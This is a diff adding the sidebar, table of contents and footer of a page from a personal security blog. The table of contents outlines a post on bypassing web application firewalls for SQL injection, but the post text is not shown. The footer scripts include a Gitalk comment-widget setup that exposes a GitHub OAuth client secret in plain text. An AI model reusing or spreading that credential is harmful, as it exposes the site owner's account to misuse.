+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+    
+      
+      
+      <div class="site-state-item site-state-tags">
+        
+          
+            <a href="/tags/">
+          
+        
+        
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+        <span class="site-state-item-count">59</span>
+        <span class="site-state-item-name">标签</span>
+        </a>
+      </div>
+    
+  </nav>
+  <div class="feed-link motion-element">
+    <a href="/atom.xml" rel="alternate">
+      <i class="fa fa-rss"></i>RSS
+    </a>
+  </div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+      
+      
+        
+      
+      
+        
+      
+        <a href="https://github.com/Wh0ale" title="GitHub &rarr; https://github.com/Wh0ale" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
+      </span>
+    
+      <span class="links-of-author-item">
+      
+      
+        
+      
+      
+        
+      
+        <a href="https://medium.com/@Wh0ale" title="Medium &rarr; https://medium.com/@Wh0ale" rel="noopener" target="_blank"><i class="fa fa-fw fa-medium"></i>Medium</a>
+      </span>
+    
+      <span class="links-of-author-item">
+      
+      
+        
+      
+      
+        
+      
+        <a href="/AttackerWh0ale@gmail.com" title="Mail &rarr; AttackerWh0ale@gmail.com"><i class="fa fa-fw fa-envelope"></i>Mail</a>
+      </span>
+    
+      <span class="links-of-author-item">
+      
+      
+        
+      
+      
+        
+      
+        <a href="https://twitter.com/Wh0ale" title="Twitter &rarr; https://twitter.com/Wh0ale" rel="noopener" target="_blank"><i class="fa fa-fw fa-twitter"></i>Twitter</a>
+      </span>
+    
+  </div>
+  <div class="cc-license motion-element" itemprop="license">
+    
+  
+    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/zh-Hans" class="cc-opacity" rel="noopener" target="_blank"><img src="/images/cc-by-nc-sa.svg" alt="Creative Commons"></a>
+  </div>
+
+
+
+        </div>
+      </div>
+      <!--noindex-->
+        <div class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+            
+            
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#0x01-BypassWaf-sql"><span class="nav-number">1.</span> <span class="nav-text">0x01 BypassWaf_sql**</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#1-数据库特性"><span class="nav-number">1.1.</span> <span class="nav-text">1. 数据库特性</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-Fuzzing"><span class="nav-number">1.2.</span> <span class="nav-text">2. Fuzzing</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3-容器特性"><span class="nav-number">1.3.</span> <span class="nav-text">*3.容器特性 *</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x02-各大厂商"><span class="nav-number">2.</span> <span class="nav-text">0x02 各大厂商</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#1-百度云"><span class="nav-number">2.1.</span> <span class="nav-text">1. 百度云</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-阿里云盾"><span class="nav-number">2.2.</span> <span class="nav-text">2.阿里云盾</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3-腾讯云"><span class="nav-number">2.3.</span> <span class="nav-text">3.腾讯云</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#4-安全狗"><span class="nav-number">2.4.</span> <span class="nav-text">4.安全狗</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#5-云锁-amp-360"><span class="nav-number">2.5.</span> <span class="nav-text">5.云锁&amp;360</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#6-安全宝-amp-阿里云盾"><span class="nav-number">2.6.</span> <span class="nav-text">6.安全宝&amp;阿里云盾</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x03-自动化Bypass"><span class="nav-number">3.</span> <span class="nav-text">0x03 自动化Bypass</span></a></li></ol></div>
+            
+
+          </div>
+        </div>
+      <!--/noindex-->
+      
+        <div class="back-to-top motion-element">
+          <i class="fa fa-arrow-up"></i>
+          
+            <span id="scrollpercent"><span>0</span>%</span>
+          
+        </div>
+      
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love" id="animate">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Wh0ale</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-area-chart"></i>
+    </span>
+    <span title="站点总字数">1.4m</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    <span title="站点阅读时长">21:52</span>
+</div>
+
+<div>
+<span id="timeDate">载入天数...</span><span id="times">载入时分秒...</span>
+<script>
+    var now = new Date();
+    function createtime() {
+        var grt= new Date("03/31/2019 00:00:00");
+        now.setTime(now.getTime()+250);
+        days = (now - grt ) / 1000 / 60 / 60 / 24; dnum = Math.floor(days);
+        hours = (now - grt ) / 1000 / 60 / 60 - (24 * dnum); hnum = Math.floor(hours);
+        if(String(hnum).length ==1 ){hnum = "0" + hnum;} minutes = (now - grt ) / 1000 /60 - (24 * 60 * dnum) - (60 * hnum);
+        mnum = Math.floor(minutes); if(String(mnum).length ==1 ){mnum = "0" + mnum;}
+        seconds = (now - grt ) / 1000 - (24 * 60 * 60 * dnum) - (60 * 60 * hnum) - (60 * mnum);
+        snum = Math.round(seconds); if(String(snum).length ==1 ){snum = "0" + snum;}
+        document.getElementById("timeDate").innerHTML = "本站已安全运行 "+dnum+" 天 ";
+        document.getElementById("times").innerHTML = hnum + " 小时 " + mnum + " 分 " + snum + " 秒";
+    }
+setInterval("createtime()",250);
+</script>
+</div>
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-user"></i>
+    </span>
+    <span class="site-uv" title="总访客量">
+      <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
+    </span>
+  
+    <span class="post-meta-divider">|</span>
+  
+    <span class="post-meta-item-icon">
+      <i class="fa fa-eye"></i>
+    </span>
+    <span class="site-pv" title="总访问量">
+      <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
+    </span>
+  
+</div>
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+
+  </div>
+
+  
+    
+    
+  
+  <script color='0,0,255' opacity='0.5' zIndex='-1' count='99' src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  <script src="/lib/jquery/index.js?v=3.4.1"></script>
+  <script src="/lib/fancybox/source/jquery.fancybox.pack.js"></script>
+  <script src="/lib/reading_progress/reading_progress.js"></script>
+  <script src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  <script src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+  <script src="/js/utils.js?v=7.3.0"></script>
+  <script src="/js/motion.js?v=7.3.0"></script>
+
+  
+  <script src="/js/affix.js?v=7.3.0"></script>
+  <script src="/js/schemes/pisces.js?v=7.3.0"></script>
+
+
+
+  
+  <script src="/js/scrollspy.js?v=7.3.0"></script>
+<script src="/js/post-details.js?v=7.3.0"></script>
+
+
+
+  <script src="/js/next-boot.js?v=7.3.0"></script>
+
+  
+
+  
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  <script src="/js/local-search.js?v=7.3.0"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+    
+<script src="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js"></script>
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.css">
+<script src="//cdn.jsdelivr.net/npm/js-md5@0.7.3/src/md5.min.js"></script>
+
+<script>
+  var gitalk = new Gitalk({
+    clientID: '925b9aa350afc793e04c',
+    clientSecret: 'bcd92ef416b81450a12e6388b00dfa49f798437a',
+    repo: 'Wh0ale.github.io',
+    owner: 'Wh0ale',
+    admin: ['Wh0ale'],
+    id: md5(location.pathname),
+      language: window.navigator.language || window.navigator.userLanguage,
+    
+    distractionFreeMode: 'true'
+  });
+  gitalk.render('gitalk-container');
+</script>
+
+
+</body>
+</html>
